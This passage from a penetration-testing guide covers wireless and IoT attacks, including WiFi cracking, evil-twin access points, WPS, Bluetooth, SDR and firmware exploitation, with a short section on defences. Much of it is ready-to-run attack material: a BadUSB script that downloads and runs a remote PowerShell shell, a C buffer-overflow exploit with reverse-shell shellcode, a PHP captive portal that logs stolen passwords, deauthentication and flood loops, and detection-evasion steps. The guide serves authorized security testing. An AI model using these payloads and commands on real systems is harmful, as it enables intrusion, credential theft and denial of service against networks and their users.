sudo openocd -f interface/buspirate.cfg -f target/stm32f1x.cfg
```

### SPI and I2C Flash Extraction

**SPI Flash Dumping**

```bash
# Using flashrom with CH341A programmer
sudo flashrom -p ch341a_spi -r firmware_backup.bin

# Verify flash content
sudo flashrom -p ch341a_spi -v firmware_backup.bin

# Write modified firmware
sudo flashrom -p ch341a_spi -w modified_firmware.bin

# Identify chip if unknown
sudo flashrom -p ch341a_spi --flash-name
```

**I2C EEPROM Reading**

```bash
# Using eeprog with I2C interface
sudo eeprog /dev/i2c-1 0x50 -r 0x0000:0x1000 -o eeprom_dump.bin

# Using Arduino as I2C bridge
# Upload I2C dump sketch, read via serial
```

### Side-Channel Analysis

**Power Analysis**

```bash
# Setup for Simple Power Analysis (SPA)
# - Current probe in power line
# - Oscilloscope capture
# - Trigger on cryptographic operations

# Differential Power Analysis (DPA)
# - Multiple traces with known inputs
# - Statistical analysis to recover keys
```

**Timing Analysis**

```bash
# Measure response times for cryptographic operations
for i in $(seq 1 1000); do
    time openssl rsa -in key.pem -passin pass:test
done

# Analyze for timing side-channels
```

---

## Wireless Security Tools and Frameworks

### Aircrack-ng Suite

The Aircrack-ng suite is the de facto standard for WiFi security testing:

```bash
# airmon-ng - Monitor mode management
sudo airmon-ng check kill  # Kill interfering processes
sudo airmon-ng start wlan0  # Enable monitor mode

# airodump-ng - Packet capture
sudo airodump-ng mon0  # Scan all channels
sudo airodump-ng -c 6 --bssid <mac> -w capture mon0

# aireplay-ng - Packet injection
sudo aireplay-ng -0 10 -a <ap_mac> -c <client_mac> mon0  # Deauth
sudo aireplay-ng -1 0 -e <ssid> -a <ap_mac> -h <our_mac> mon0  # Fake auth
sudo aireplay-ng -3 -b <ap_mac> -h <our_mac> mon0  # ARP replay

# aircrack-ng - Password cracking
aircrack-ng -w wordlist.txt capture.cap
aircrack-ng -b <bssid> -w wordlist.txt capture.cap

# airdecap-ng - Decrypt WEP/WPA capture
airdecap-ng -w <wep_key> capture.cap
airdecap-ng -e <ssid> -p <passphrase> capture.cap

# airbase-ng - Soft AP creation
sudo airbase-ng -e "FreeWiFi" -c 6 mon0
```

### Bettercap

Bettercap is a powerful, modular attack framework:

```bash
# WiFi reconnaissance
sudo bettercap -eval "wifi.recon on; wifi.show"

# Specific channel monitoring
sudo bettercap -eval "wifi.recon.channel 1,6,11; wifi.recon on; wifi.show"

# Deauthentication attack
sudo bettercap
gap > set wifi.interface wlan0mon
gap > wifi.recon on
gap > wifi.deauth <bssid>

# Association probe sniffing
sudo bettercap -eval "wifi.recon on; wifi.assoc all"

# BLE reconnaissance
sudo bettercap -eval "ble.recon on; ble.show"

# HID injection (Bluetooth keyboard)
sudo bettercap
gap > hid.inject on
gap > hid.type "Hello World"
```

### Wireshark for Wireless Analysis

```bash
# Capture wireless traffic
tshark -i mon0 -w wireless_capture.pcap

# Common display filters
# Decrypt WPA traffic (requires key)
# Edit -> Preferences -> Protocols -> IEEE 802.11 -> Decryption Keys

# Filter by frame type
wlan.fc.type == 0  # Management frames
wlan.fc.type == 1  # Control frames
wlan.fc.type == 2  # Data frames

# Specific frame subtypes
wlan.fc.type_subtype == 0x08  # Beacon frames
wlan.fc.type_subtype == 0x04  # Probe Request
wlan.fc.type_subtype == 0x05  # Probe Response
wlan.fc.type_subtype == 0x0c  # Deauthentication

# Filter by SSID
wlan.ssid == "TargetNetwork"

# EAPOL frames (WPA handshakes)
eapol

# WPS probe
wlan.wps.setup_state == 0x01
```

### Flipper Zero

Flipper Zero is a portable multi-tool for pentesters:

```bash
# SubGHz scanning
# Navigate to: SubGHz -> Read
# Set frequency: 315/433/868 MHz

# RFID/NFC reading
# NFC -> Read
# 125kHz -> Read

# BadUSB attacks
# Bad USB -> Load script
# Scripts in: /ext/badusb/

# Infrared capture and replay
# Infrared -> Learn New Remote

# GPIO/UART debugging
# GPIO -> USB-UART Bridge
```

**Flipper Zero BadUSB Example**

```ducky
REM Windows Reverse Shell via BadUSB
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/shell.ps1')"
ENTER
```

### Specialized Tools Summary

| Tool | Purpose | Use Case |
|------|---------|----------|
| Wifite | Automated WiFi auditing | Quick WPA/WPS assessments |
| Wifiphisher | Evil twin attacks | Credential harvesting |
| Eaphammer | WPA2-Enterprise attacks | Evil twin against 802.1X |
| Hostapd-mana | Advanced rogue AP | KARMA and corporate attacks |
| Gsrv | Bluetooth scanner | BT service enumeration |
| Bluelog | Bluetooth logging | Passive BT discovery |
| UAT | BLE testing | iOS/macOS BLE analysis |
| Mirage | Wireless framework | Modular BT/BLE attacks |
| Killerbee | Zigbee security | 802.15.4 packet analysis |
| RFCat | RF transceiver | SubGHz communication |
| URH | Universal Radio Hacker | SDR signal analysis |
| GQRX | SDR receiver | Spectrum visualization |

---

## Practical Wireless Pentest Methodology

### Pre-Engagement Phase

**Scope Definition**
- Identify wireless networks in scope
- Define testing times and notification requirements
- Establish rules of engagement for denial-of-service testing
- Confirm physical location boundaries

**Legal and Compliance**
- Obtain written authorization
- Verify compliance requirements (PCI-DSS, HIPAA, etc.)
- Check local regulations on wireless transmission

### Reconnaissance Phase

**Passive Information Gathering**
```bash
# Initial site survey
sudo airodump-ng mon0 -w initial_survey

# Analyze for 24-48 hours
# Document: SSIDs, BSSIDs, channels, security types, client counts

# Identify AP vendors (OUI analysis)
airodump-ng mon0 | grep -E "([0-9A-F]{2}:){5}[0-9A-F]{2}"
# Cross-reference with wireshark.org/tools/oui-lookup.html
```

**Active Scanning**
```bash
# Targeted scanning
sudo airodump-ng -c <channel> --bssid <bssid> -w target_network mon0

# WPS enumeration
sudo wash -i mon0 -C

# Enterprise network identification
sudo airodump-ng mon0 --wps | grep -i "WPA2.*CCMP.*PSK\|WPA2.*CCMP.*MGT"
```

### Vulnerability Analysis

**Encryption Assessment**
- Document all WEP networks (critical finding)
- Identify WPA-TKIP usage (deprecated)
- Check for WPS enabled on WPA networks
- Note WPA3-transition mode configurations

**Configuration Review**
```bash
# Analyze beacon frames for capabilities
# Check for: WMM, 802.11n/ac/ax support, channel width
# Security features: PMF, RSN capabilities

# Hidden SSID identification
sudo airodump-ng mon0 --essid ""
# Deauth clients to reveal hidden SSIDs
sudo aireplay-ng -0 5 -a <bssid> mon0
```

### Exploitation Phase

**WPA2-Personal Attack Flow**
```bash
# 1. Target selection
# - Client count (more clients = better chance of handshake)
# - Signal strength (closer = better)

# 2. Capture handshake
sudo airodump-ng -c <ch> --bssid <bssid> -w capture mon0
# (In another terminal)
sudo aireplay-ng -0 5 -a <bssid> mon0

# 3. Verify capture
aircrack-ng capture-01.cap

# 4. Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <bssid> capture-01.cap

# 5. GPU acceleration if needed
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 wordlist.txt
```

**Enterprise Network Attack**
```bash
# Evil twin setup
sudo hostapd-mana hostapd.conf
sudo dnsmasq -C dnsmasq.conf
sudo responder -I wlan0 -wrf

# Direct 802.1X attacks
credentials harvest from EAP-PEAP
crack EAP-MSCHAPv2 challenges with asleap/hashcat
```

### Post-Exploitation

**Network Access**
```bash
# Once connected, treat as internal pentest
# Discover network topology
nmap -sn 192.168.1.0/24

# Identify gateway and DNS
ip route | grep default
ipconfig /all  # Windows

# Pivot to wired network if possible
# Check for dual-homed systems
```

**Credential Harvesting**
```bash
# Responder for internal credential harvesting
sudo responder -I wlan0 -wrf

# DHCP-based attacks
sudo nmap --script broadcast-dhcp-discover

# DNS hijacking
# Configure rogue DNS, redirect to malicious portals
```

### IoT Device Testing Workflow

```bash
# 1. Device reconnaissance
nmap -sV -p- <device_ip>
# Check for default ports: HTTP/HTTPS, Telnet, SSH, MQTT, CoAP

# 2. Firmware acquisition
# - Check manufacturer website
# - Extract from device if possible
# - Intercept OTA update

# 3. Firmware analysis
binwalk -e firmware.bin
strings extracted/* | grep -i password

# 4. Protocol testing
# - MQTT: test for anonymous auth
mosquitto_sub -h <ip> -t "#" -v

# - CoAP: enumerate resources
coap-client -m get coap://<ip>:5683/.well-known/core

# 5. Hardware testing
# - UART discovery
# - JTAG if accessible
# - SPI flash reading

# 6. Radio analysis (if applicable)
# - BLE: gatttool enumeration
# - Zigbee: killerbee analysis
# - SDR: frequency identification
```

---

## Defensive Countermeasures

### WiFi Security Best Practices

**Encryption Standards**
- Use WPA3-Enterprise for corporate environments
- WPA3-Personal acceptable for smaller deployments
- WPA2-Enterprise minimum acceptable standard
- Never use WPA-TKIP or WEP

**Configuration Hardening**
```bash
# Disable WPS (both PIN and push-button)
# Enable Protected Management Frames (PMF)
# Use 802.11w for management frame protection
# Disable legacy data rates (1, 2, 5.5, 11 Mbps)
# Enable rogue AP detection features
```

**Network Segmentation**
- Separate IoT devices onto isolated VLANs
- Implement wireless client isolation
- Use different SSIDs for different security zones
- Apply ACLs restricting IoT device communication

### IoT Security Recommendations

**Device Procurement**
- Evaluate security track record of manufacturer
- Check for firmware update history
- Verify secure boot capabilities
- Assess hardware security features

**Deployment Security**
```bash
# Change default passwords immediately
# Disable unnecessary services (Telnet, UPnP)
# Enable automatic updates if available
# Configure secure MQTT with TLS and authentication
# Implement network segmentation
```

**Monitoring and Detection**
```bash
# Deploy wireless IDS/IPS
# Monitor for rogue access points
# Alert on deauthentication floods
# Track association anomalies
# Detect Evil Twin attacks
```

### Bluetooth and BLE Security

- Use BLE 4.2+ with LE Secure Connections
- Implement proper pairing methods (avoid Just Works)
- Enable bonding for persistent secure connections
- Verify attribute permissions on GATT characteristics
- Use privacy features (random MAC addresses)

### Zigbee/Z-Wave Security

- Use Security 2 (S2) for Z-Wave installations
- Secure inclusion process (no key transmission in plaintext)
- Centralized trust center for Zigbee
- Regular key rotation where supported
- Network layer encryption mandatory

---

## Advanced WiFi Exploitation Techniques

### Enterprise WiFi Attacks

**WPA2-Enterprise (802.1X) Attack Vectors**

Enterprise WiFi deployments using 802.1X authentication present unique attack opportunities beyond standard WPA2-Personal networks:

```bash
# EAP method enumeration
# Using eaphammer to identify supported EAP methods
eaphammer --eap-spray --interface wlan0 --wordlist passwords.txt --ssid CorporateWiFi

# EAP-MD5 attack (vulnerable to offline cracking)
# Capture challenge-response and crack
asleap -C <challenge> -R <response> -W wordlist.txt

# EAP-PEAP and EAP-TTLS credential harvesting
# Setup rogue AP with EAPHammer
eaphammer --interface wlan0 --essid CorporateWiFi --auth ttls --cred-log creds.log

# Hostapd-mana for enterprise attacks
sudo hostapd-mana hostapd.conf
# Configuration includes:
# enable_mana=1
# mana_wpe=1 (WPE - Wireless Pwnage Edition)
```

**Rogue AP Attack Chain for Enterprise**

```bash
# Step 1: Reconnaissance
airodump-ng mon0 --wps
# Identify target SSID, channel, and security

# Step 2: Create evil twin with hostapd-mana
cat > hostapd-mana.conf << 'EOF'
interface=wlan0
ssid=CorporateWiFi
driver=nl80211
channel=1
hw_mode=g
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=users
wpa=2
wpa_key_mgmt=WPA-EAP
auth_algs=3
wpa_pairwise=TKIP CCMP
mana_wpe=1
enable_mana=1
mana_loud=0
EOF

# Step 3: Setup DHCP
cat > dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.88.10,192.168.88.250,12h
dhcp-option=3,192.168.88.1
dhcp-option=6,192.168.88.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Step 4: Launch attack
sudo hostapd-mana hostapd-mana.conf &
sudo dnsmasq -C dnsmasq.conf -d

# Step 5: Credential interception
# Credentials saved to hostapd-mana.log
tail -f hostapd-mana.log
```

**Certificate Validation Bypass**

Many devices fail to properly validate RADIUS server certificates:

```bash
# Self-signed certificate attack
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=Corporate RADIUS"

# Deploy with rogue AP - clients often connect without validation
```

### Advanced Deauthentication Attacks

**Targeted Deauthentication**

```bash
# Mass deauthentication (disrupt all clients)
aireplay-ng -0 0 -a <bssid> mon0

# Stealth deauthentication (single burst)
aireplay-ng -0 1 -a <bssid> -c <client_mac> mon0

# Continuous deauth to force clients to evil twin
while true; do
    aireplay-ng -0 1 -a <bssid> -c <client_mac> mon0
    sleep 30
done
```

**Deauthentication Detection and Avoidance**

From a defensive testing perspective:

```bash
# Detect deauthentication frames with Wireshark filter
wlan.fc.type_subtype == 0x0c

# Monitor with airodump-ng for excessive deauths
airodump-ng mon0 --write deauth_detection
# Then analyze with: aircrack-ng deauth_detection-01.cap

# WIDS/WIPS evasion techniques
# - Slow deauth (space out attacks)
# - Target individual clients (less noticeable)
# - Use valid-looking source addresses
```

### Advanced WPS Attacks

**Pixie Dust Attack Deep Dive**

The Pixie Dust attack exploits weak random number generation in WPS PIN methods:

```bash
# Reaver Pixie Dust mode
sudo reaver -i mon0 -b <bssid> -vv -K 1 -c <channel>

# Wash to find WPS-enabled APs
sudo wash -i mon0 -C

# Bully with Pixie Dust
sudo bully -b <bssid> -c <channel> -d -v 3 wlan0mon
```

**WPS PIN Algorithm Weaknesses**

```bash
# Some manufacturers use predictable PIN algorithms
# Calculate PIN from MAC address (certain manufacturers)
# Tools: wpspin (offline PIN calculator)

# Generate possible PINs based on MAC
wpspin <mac_address>

# Test generated PINs
for pin in $(wpspin <mac>); do
    sudo reaver -i mon0 -b <bssid> -p $pin -vv
done
```

## Advanced IoT Exploitation

### Smart Home Device Hacking

**Amazon Alexa and Google Home**

Smart speakers present unique attack surfaces:

```bash
# Network traffic analysis
# Capture traffic during setup and normal operation
tshark -i wlan0 -f "host <device_ip>" -w smart_speaker.pcap

# Firmware extraction (if physical access)
# UART connection for boot logs
minicom -D /dev/ttyUSB0 -b 115200

# Alexa Skills Kit (ASK) security assessment
# Review skill permissions and data handling
# Test for intent confusion attacks
```

**Smart Locks and Access Control**

```bash
# Bluetooth lock testing with gatttool
gatttool -b <lock_mac> -I
> connect
> primary
> characteristics
> char-write-cmd <handle> <unlock_command>

# Replay attack testing
# Capture unlock command with Ubertooth
ubertooth-btle -f -c lock_capture.pcap

# Replay with gatttool after device reset
```

**IP Camera Exploitation**

```bash
# Default credential testing
# Many cameras ship with admin/admin or admin/password
hydra -l admin -P camera_passwords.txt <target> http-get /

# RTSP stream access
vlc rtsp://admin:password@<target>:554/stream1

# ONVIF enumeration
# Using onvif-discover and onvif-util
onvif-discover
onvif-util -a <target> -u admin -p password

# Firmware backdoor analysis
binwalk -e camera_firmware.bin
strings extracted/* | grep -i password
```

### Industrial IoT (IIoT) Security

**Modbus and SCADA Wireless**

```bash
# Modbus TCP enumeration
diapaz-modbus-client -t <target> -p 502

# Wireless Modbus interception
# Capture 900 MHz or 2.4 GHz traffic with SDR

# DNP3 protocol analysis
# Using OpenDNP3 or similar libraries
```

**Wireless Sensor Networks**

```bash
# 6LoWPAN analysis (IPv6 over Low-Power Wireless Personal Area Networks)
# Using Contiki OS tools or custom Scapy scripts

# WirelessHART security assessment
# Requires specialized hardware (HART modem)
```

## Advanced SDR Exploitation

### RF Protocol Analysis

**Analyzing Unknown Protocols**

```bash
# Record signal with GNU Radio
gnuRadio-companion
# Build flowgraph: RTL-SDR Source -> File Sink

# Analyze with Universal Radio Hacker
urh
# - Load recorded signal
# - Determine modulation (ASK, FSK, PSK)
# - Identify symbol rate
# - Decode data

# Inspectrum for visual analysis
inspectrum capture.cfile
```

**Key Fob Cloning Advanced**

```bash
# Analyze rolling code implementation
# Capture multiple button presses
rtl_433 -f 433920000 -S all

# Analyze with RFcrack
rfcrack analyze -f 433.92M -m OOK -r capture.cu8

# Decode with known decoder
rtl_433 -r capture.cu8 -X "n=keyfob,m=OOK_PWM,s=350,l=700,r=8000,g=1000,rows>=1"
```

### Vehicle Communication Systems

**TPMS (Tire Pressure Monitoring Systems)**

```bash
# TPMS monitoring with RTL-SDR
rtl_433 -f 315000000 -R 59  # Ford TPMS
rtl_433 -f 433920000 -R 60  # Schrader TPMS

# Spoof TPMS signals
# Craft fake low pressure warnings
```

**Keyless Entry Systems**

```bash
# Capture key fob signals
# 315 MHz (US/Japan), 433 MHz (Europe), 868 MHz (some luxury vehicles)
rtl_433 -f 315000000 -S known

# Relay attack demonstration
# Using two SDRs or specialized relay devices
# One near key, one near vehicle
```

## Wireless Security in Enterprise Environments

### Wireless Intrusion Detection Evasion

**Evading WIDS/WIPS Systems**

```bash
# Change MAC address frequently
macchanger -r wlan0

# Use randomized SSID probes
mdk4 wlan0 p -t random_ssids.txt

# Slow and low scanning
# Reduce probe rate to avoid threshold-based detection

# Mimic legitimate client behavior
# Associate to legitimate APs between attacks
```

### BYOD and Guest Network Security

**Captive Portal Attacks**

```bash
# Create fake captive portal
# Using wifiphisher
cd wifiphisher
sudo python3 wifiphisher.py -aI wlan0 -e "GuestWiFi" -p oauth-login

# Custom captive portal
cat > index.php << 'EOF'
<?php
$username = $_POST['username'];
$password = $_POST['password'];
file_put_contents("creds.txt", "$username:$password\n", FILE_APPEND);
header("Location: http://legitimate-site.com");
?>
EOF

# DNS redirection for portal
# Redirect all traffic to attacker's portal page
```

**MDM Bypass Techniques**

```bash
# Jailbreak detection bypass
# Using Frida or similar dynamic instrumentation
frida -U -f com.company.mdm -l bypass.js

# Container escape from managed profiles
# Exploit OS vulnerabilities in MDM implementations
```

## Emerging Wireless Threats

### 5G Security Considerations

**5G Architecture Attack Vectors**

```bash
# 5G network slicing vulnerabilities
# gNodeB (base station) simulation with srsRAN

# Install srsRAN
sudo apt-get install srsran

# Configure and run gNodeB
# Analyze UE (User Equipment) behavior
```

**LTE/4G Interception**

```bash
# LTE cell search with srsLTE
sudo srslte_lte_cell_search -b <band>

# Jam specific LTE frequencies (illegal without authorization)
# Detection and analysis only in authorized testing
```

### WiFi 6 and 6E Security

**WPA3-Enterprise Enhancements**

```bash
# 802.11ax (WiFi 6) target wake time analysis
# Power save mechanisms may introduce timing attacks

# 6 GHz (WiFi 6E) spectrum analysis
# New attack surface in less congested spectrum
iw dev wlan0 scan freq 5975-7115
```

### LoRa and LPWAN Security

**LoRaWAN Security Assessment**

```bash
# LoRa frequency analysis (868 MHz EU, 915 MHz US)
gqrx # Visual analysis

# LoRaWAN packet capture with LoRa Dongle
# Using RFM95W or similar modules with custom firmware

# Analyze with gr-lora (GNU Radio)
# Decrypt if AppKey is obtained
```

## Conclusion

Wireless and IoT security testing represents a critical domain in modern penetration testing. The techniques covered in this chapter—from WiFi encryption attacks to embedded hardware exploitation—provide a comprehensive foundation for assessing wireless attack surfaces.

Key takeaways:
1. **No wireless is inherently secure**—all wireless transmissions can be intercepted with appropriate equipment
2. **IoT devices expand attack surfaces** exponentially and often lack basic security controls
3. **Physical access enables deeper compromise** through hardware interfaces like UART and JTAG
4. **Radio frequency analysis** opens additional attack vectors beyond traditional networking
5. **Defense in depth** is essential—assume wireless networks are or will be compromised
6. **Enterprise wireless requires specialized approaches**—802.1X, certificate validation, and rogue AP detection
7. **IoT firmware analysis reveals widespread vulnerabilities**—hardcoded credentials, update mechanisms, and protocol implementations
8. **SDR enables analysis of proprietary protocols**—key fobs, sensors, and industrial systems
9. **Emerging technologies bring new risks**—5G, WiFi 6E, and LPWAN require updated testing methodologies

As wireless technologies continue evolving with WiFi 6/6E/7, Bluetooth 5.x, and new IoT protocols, penetration testers must continuously update their skills and tools. The methodologies presented here provide a solid foundation, but practical experience and ongoing research are essential for staying current in this rapidly changing field.

## Wireless Vulnerability Research and Exploitation Frameworks

### Exploit Development for Embedded Wireless Devices

**Firmware Reverse Engineering for Exploits**

Developing exploits for wireless devices requires deep firmware analysis:

```bash
# Firmware unpacking and filesystem analysis
binwalk -e router_firmware.bin
cd _router_firmware.bin.extracted/

# Identify CPU architecture for exploit development
file squashfs-root/bin/busybox
# Common architectures: MIPS, ARM, PowerPC, x86

# Cross-compilation setup for MIPS
sudo apt-get install gcc-mips-linux-gnu
mips-linux-gnu-gcc -o exploit_mips exploit.c -static

# Cross-compilation for ARM
sudo apt-get install gcc-arm-linux-gnueabi
arm-linux-gnueabi-gcc -o exploit_arm exploit.c -static
```

**Buffer Overflow Exploitation on Wireless Devices**

```c
// Example: Simple stack buffer overflow exploit for embedded device
// Target: HTTP server on wireless router

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// MIPS shellcode - reverse shell
// Connects back to 192.168.1.100:4444
unsigned char shellcode[] = 
    "\x24\x0f\xff\xfa"     // li $t7, -6
    "\x01\xe0\x78\x27"     // nor $t7, $zero
    "\x21\xe4\xff\xfd"     // addi $a0, $t7, -3
    "\x21\xe5\xff\xfd"     // addi $a1, $t7, -3
    "\x28\x06\xff\xff"     // slti $a2, $zero, -1
    "\x24\x02\x10\x57"     // li $v0, 4183 (socket)
    "\x01\x01\x01\x0c"     // syscall
    // ... additional shellcode
;

int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_in target;
    char payload[1024];
    
    // Offset to return address (determined through crash analysis)
    int offset = 512;
    
    // Build payload
    memset(payload, 'A', offset);                    // Padding
    memcpy(payload + offset, "\x7f\xff\x5a\x80", 4);  // Return address
    memcpy(payload + offset + 4, shellcode, sizeof(shellcode));
    
    // Send to vulnerable HTTP endpoint
    sock = socket(AF_INET, SOCK_STREAM, 0);
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    inet_pton(AF_INET, argv[1], &target.sin_addr);
    
    connect(sock, (struct sockaddr *)&target, sizeof(target));
    
    char request[2048];
    sprintf(request, "GET /%s HTTP/1.1\r\nHost: %s\r\n\r\n", payload, argv[1]);
    send(sock, request, strlen(request), 0);
    
    close(sock);
    return 0;
}
```

**Heap Exploitation in Embedded Systems**

```bash
# Analyze heap implementation in firmware
# Common implementations: dlmalloc, ptmalloc, custom allocators

# Find malloc/free in binary
r2 -A firmware_binary
[0x00000000]> ii~malloc
[0x00000000]> ii~free

# Identify heap metadata structures
# UAF (Use-After-Free) vulnerability identification
[0x00000000]> /c free.*malloc

# Heap layout analysis
# MIPS typical heap structure: prev_size | size | fd | bk | data
```

### Wireless Protocol Stack Vulnerabilities

**IEEE 802.11 State Machine Attacks**

The 802.11 state machine transitions present attack opportunities:

```
State Machine States:
1. Unauthenticated/Unassociated
2. Authenticated/Unassociated  
3. Authenticated/Associated
4. Authenticated/Associated/802.1X (EAP)
5. Authenticated/Associated/802.1X/Key Exchange

State Transitions and Attacks:
- Authentication Request/Response (State 1->2)
  * Shared key authentication capture for IV collection
  * Open system authentication flooding

- Association Request/Response (State 2->3)
  * Association flooding (DoS)
  * Fake AP association for client attacks

- EAP Exchange (State 3->4)
  * EAP method downgrade attacks
  * Certificate validation bypass

- 4-Way Handshake (State 4->5)
  * KRACK (Key Reinstallation)
  * HS20/Passpoint credential theft
```

```python
# Scapy-based state machine fuzzing
from scapy.all import *
from scapy.layers.dot11 import *

class Dot11StateFuzzer:
    def __init__(self, interface):
        self.iface = interface
        self.sequence = 0
        
    def send_auth_flood(self, bssid, client, count=1000):
        """Flood authentication requests"""
        for i in range(count):
            auth = RadioTap() / Dot11(
                addr1=bssid, addr2=client, addr3=bssid,
                SC=self.sequence
            ) / Dot11Auth(
                algo=0,  # Open system
                seqnum=1,
                status=0
            )
            sendp(auth, iface=self.iface, verbose=False)
            self.sequence += 16
            
    def send_assoc_flood(self, bssid, client, ssid, count=1000):
        """Flood association requests"""
        for i in range(count):
            assoc = RadioTap() / Dot11(
                addr1=bssid, addr2=client, addr3=bssid,
                SC=self.sequence
            ) / Dot11AssoReq(
                cap=0x1100
            ) / Dot11Elt(ID='SSID', info=ssid) / \
            Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96')
            sendp(assoc, iface=self.iface, verbose=False)
            self.sequence += 16

# Usage
fuzzer = Dot11StateFuzzer("wlan0mon")
fuzzer.send_auth_flood("aa:bb:cc:dd:ee:ff", "11:22:33:44:55:66")
```

### Wireless Intrusion Detection Evasion

**Advanced WIDS Evasion Techniques**

```bash
# Fragmented probe requests to evade detection
# Split probe across multiple frames

# Timing-based evasion
# Slow probe rate to stay under detection thresholds
while read ssid; do
    iw dev wlan0 scan ssid "$ssid" | grep -E "SSID|signal"
    sleep $((RANDOM % 10 + 5))  # Random 5-15 second delay
done < target_ssids.txt

# MAC address randomization for continuous scanning
for i in {1..100}; do
    macchanger -r wlan0
    airodump-ng -c 1 --bssid <target> -w capture wlan0mon &
    sleep 30
    killall airodump-ng
done

# Protocol-compliant evasion
# Use only standard-compliant frames at standard intervals
# Mimic legitimate client behavior patterns
```

### IoT Botnet Analysis and Mitigation

**Mirai-Style Botnet Analysis**

Understanding IoT botnets helps in defensive testing:

```bash
# Botnet C2 communication analysis
# Capture traffic from infected IoT device
tcpdump -i eth0 -w botnet_traffic.pcap host <c2_ip>

# Analyze C2 protocol
# Common patterns: Telnet/SSH brute force, HTTP callbacks, IRC

# Mirai signature detection
# Scan for Mirai default credential attempts
zmap -p 23 --probe-args=file:mirai_telnet_payload.bin

# Botnet propagation simulation (isolated lab only)
# Test device vulnerability to botnet infection vectors
```

**IoT Honeypot Deployment**

```bash
# Cowrie IoT Honeypot (Telnet/SSH)
docker run -p 2222:2222 -p 2223:2223 cowrie/cowrie

# Dionaea IoT malware capture
docker run -p 21:21 -p 23:23 -p 80:80 dinotools/dionaea

# Conpot ICS/SCADA honeypot
docker run -p 102:102 -p 502:502 mushorg/conpot

# Analyze captured malware samples
# Extract indicators of compromise
yara -r iot_malware_rules.yar /var/honeypot/captures/
```

### Wireless Penetration Testing Standards

**OWASP IoT Testing Methodology**

```
OWASP IoT Top 10 (2023):
1. Weak, Guessable, or Hardcoded Passwords
2. Insecure Network Services
3. Insecure Ecosystem Interfaces
4. Lack of Secure Update Mechanism
5. Use of Insecure or Outdated Components
6. Insufficient Privacy Protection
7. Insecure Data Transfer and Storage
8. Lack of Device Management
9. Insecure Default Settings
10. Lack of Physical Hardening

Testing Approach per Category:
- Passwords: Dictionary attacks, firmware extraction, debug interface testing
- Network Services: Port scanning, protocol fuzzing, DoS testing
- Ecosystem Interfaces: API testing, cloud security, mobile app analysis
- Update Mechanism: OTA interception, signature validation, rollback testing
```

**PTES (Penetration Testing Execution Standard) for Wireless**

```
PTES Wireless Extension:

Pre-engagement Interactions:
- Define wireless scope (internal, external, guest networks)
- Identify restricted channels/frequencies
- Establish physical testing boundaries
- Define out-of-scope attack types

Intelligence Gathering:
- RF spectrum survey
- Regulatory compliance mapping
- Building/area coverage mapping
- Client device enumeration

Threat Modeling:
- Wireless-specific threat actors
- Physical proximity requirements
- Equipment capability assessment

Vulnerability Analysis:
- Protocol-level testing
- Implementation testing
- Configuration assessment

Exploitation:
- Credential-based attacks
- Protocol exploitation
- Physical layer attacks

Post-Exploitation:
- Lateral movement via wireless
- Credential harvesting
- Persistence establishment

Reporting:
- RF coverage maps
- Attack path visualization
- Remediation prioritization
```

### Wireless Testing in Specialized Environments

**Healthcare Environment Testing**

Medical devices present unique wireless security challenges:

```bash
# FDA-recognized standards consideration
# IEC 80001 - Risk management for IT networks

# Medical device wireless assessment priorities:
# 1. Patient safety impact
# 2. Data integrity (EMR integration)
# 3. Availability (life support systems)
# 4. Compliance (HIPAA)

# Bluetooth medical device testing
# Blood glucose monitors, insulin pumps, pacemakers
# Test for pairing vulnerabilities, data encryption, replay attacks

# WiFi medical device testing
# Patient monitors, infusion pumps, ventilators
# Test for network segmentation, VLAN hopping, credential exposure
```

**Industrial Control System (ICS) Wireless**

```bash
# ISA/IEC 62443 compliance consideration

# WirelessHART security testing
# Uses 2.4 GHz DSSS with AES-128
# Test for: jamming, replay, key extraction

# Wireless SCADA protocols
# 900 MHz unlicensed band common
rtl_433 -f 915000000 -a

# IEEE 802.15.4/Zigbee in industrial settings
# Smart grid, pipeline monitoring, facility control
# Test for: network key compromise, routing attacks, device spoofing
```

Remember that wireless penetration testing often has legal and regulatory implications that vary by jurisdiction. Always operate with proper authorization, appropriate scope, and professional ethics. The wireless spectrum is regulated in most countries, and transmitting on frequencies without authorization can result in severe penalties.
